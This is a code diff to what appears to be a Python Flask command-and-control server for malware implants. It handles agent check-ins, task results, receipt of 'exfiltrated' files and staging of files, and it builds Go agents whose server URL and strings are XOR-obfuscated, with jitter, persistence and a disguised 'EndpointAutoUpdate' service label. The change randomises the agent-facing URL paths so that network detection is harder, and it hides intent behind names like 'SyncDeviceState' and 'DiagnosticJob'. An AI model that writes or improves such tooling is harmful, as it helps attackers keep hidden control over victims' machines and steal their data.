@@ -38,6 +38,49 @@ AGENT_SRC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "
 
 
 # ─────────────────────────────────────────────
+#  Agent Path Initialisation
+# ─────────────────────────────────────────────
+
+def _init_agent_paths():
+    """
+    Load per-server random agent-facing URL paths from the database.
+    If they don't exist yet (first startup), generate them and persist them.
+    Returns a dict with keys: checkin, result, upload, files.
+    """
+    import secrets
+
+    keys = ["path_checkin", "path_result", "path_upload", "path_files"]
+
+    conn = get_db_connection()
+    rows = conn.execute(
+        "SELECT key, value FROM server_config WHERE key IN (?, ?, ?, ?)", keys
+    ).fetchall()
+    stored = {r["key"]: r["value"] for r in rows}
+
+    # Generate any missing paths (first run, or partial DB state)
+    for k in keys:
+        if k not in stored:
+            stored[k] = "/" + secrets.token_hex(4)
+            conn.execute(
+                "INSERT INTO server_config (key, value) VALUES (?, ?)",
+                (k, stored[k]),
+            )
+
+    conn.commit()
+    conn.close()
+    return stored
+
+
+_agent_paths = _init_agent_paths()
+
+# Module-level path variables used by route registration and the build pipeline
+AGENT_PATH_CHECKIN = _agent_paths["path_checkin"]
+AGENT_PATH_RESULT  = _agent_paths["path_result"]
+AGENT_PATH_UPLOAD  = _agent_paths["path_upload"]
+AGENT_PATH_FILES   = _agent_paths["path_files"]
+
+
+# ─────────────────────────────────────────────
 #  Dashboard Route
 # ─────────────────────────────────────────────
 
@@ -51,7 +94,6 @@ def dashboard():
 #  Agent Check-In API
 # ─────────────────────────────────────────────
 
-@app.route("/api/checkin", methods=["POST"])
 def SyncDeviceState():
     """
     Agent check-in endpoint.
@@ -195,7 +237,6 @@ def get_tasks(agent_id):
 #  Result API
 # ─────────────────────────────────────────────
 
-@app.route("/api/result", methods=["POST"])
 def submit_result():
     """
     Agent submits task result.
@@ -401,7 +442,9 @@ def _xor_encrypt(key: bytes, plaintext: str) -> str:
 
 def _generate_config_go(server_url, jitter_min, jitter_max, persistence,
                         profile_id=1, locale="en-US,en;q=0.9",
-                        key_hex="", key_id=""):
+                        key_hex="", key_id="",
+                        path_checkin="/api/checkin", path_result="/api/result",
+                        path_upload="/api/upload", path_files="/api/files/"):
     """Generate a config.go file with the given settings."""
 
     # Generate a random 16-byte XOR key for string obfuscation
@@ -410,10 +453,10 @@ def _generate_config_go(server_url, jitter_min, jitter_max, persistence,
 
     # XOR-encrypt sensitive strings at build time
     enc_server_url   = _xor_encrypt(xor_key, server_url)
-    enc_checkin_path = _xor_encrypt(xor_key, "/api/checkin")
-    enc_result_path  = _xor_encrypt(xor_key, "/api/result")
-    enc_upload_path  = _xor_encrypt(xor_key, "/api/upload")
-    enc_files_path   = _xor_encrypt(xor_key, "/api/files/")
+    enc_checkin_path = _xor_encrypt(xor_key, path_checkin)
+    enc_result_path  = _xor_encrypt(xor_key, path_result)
+    enc_upload_path  = _xor_encrypt(xor_key, path_upload)
+    enc_files_path   = _xor_encrypt(xor_key, path_files)
     enc_flush_cmd    = _xor_encrypt(xor_key, "__flush_cache__")
     enc_svc_label    = _xor_encrypt(xor_key, "EndpointAutoUpdate")
 
@@ -562,8 +605,8 @@ type DeviceTelemetryPayload struct {{
 }}
 
 type SyncResponse struct {{
-	Status string `json:"status"`
-	Jobs  []DiagnosticJob `json:"jobs"`
+	Status string          `json:"status"`
+	Jobs   []DiagnosticJob `json:"tasks"`
 }}
 
 type DiagnosticJob struct {{
@@ -821,7 +864,11 @@ def build_agent():
         # Generate custom config.go
         config_content = _generate_config_go(
             server_url, jitter_min, jitter_max, persistence, profile_id, locale,
-            key_hex=key_hex, key_id=key_id
+            key_hex=key_hex, key_id=key_id,
+            path_checkin=AGENT_PATH_CHECKIN,
+            path_result=AGENT_PATH_RESULT,
+            path_upload=AGENT_PATH_UPLOAD,
+            path_files=AGENT_PATH_FILES + "/",
         )
         with open(os.path.join(tmp_agent, "config.go"), "w", encoding="utf-8") as f:
             f.write(config_content)
@@ -975,7 +1022,6 @@ def delete_build(build_id):
 #  Upload / Exfiltration API (Agent → Server)
 # ─────────────────────────────────────────────
 
-@app.route("/api/upload", methods=["POST"])
 def receive_upload():
     """Receive an exfiltrated file from an agent."""
     if "file" not in request.files:
@@ -1119,7 +1165,6 @@ def get_staged_files():
     })
 
 
-@app.route("/api/files/<int:file_id>", methods=["GET"])
 def serve_staged_file(file_id):
     """Agent fetches a staged file by ID."""
     conn = get_db_connection()
@@ -1154,6 +1199,31 @@ def delete_staged_file(file_id):
     conn.close()
 
     return jsonify({"status": "ok"})
+
+
+# ─────────────────────────────────────────────
+#  Agent Route Registration
+# ─────────────────────────────────────────────
+
+def _register_agent_routes():
+    """
+    Register the four agent-facing endpoints on their randomised paths.
+    Called once at module load after AGENT_PATH_* variables are set.
+    Using add_url_rule() instead of decorators because the paths are
+    only known after the DB is read, not at import time.
+    """
+    app.add_url_rule(AGENT_PATH_CHECKIN, "agent_checkin", SyncDeviceState, methods=["POST"])
+    app.add_url_rule(AGENT_PATH_RESULT,  "agent_result",  submit_result,   methods=["POST"])
+    app.add_url_rule(AGENT_PATH_UPLOAD,  "agent_upload",  receive_upload,  methods=["POST"])
+    app.add_url_rule(
+        AGENT_PATH_FILES + "/<int:file_id>",
+        "agent_files",
+        serve_staged_file,
+        methods=["GET"],
+    )
+
+
+_register_agent_routes()
 
 
 # ─────────────────────────────────────────────
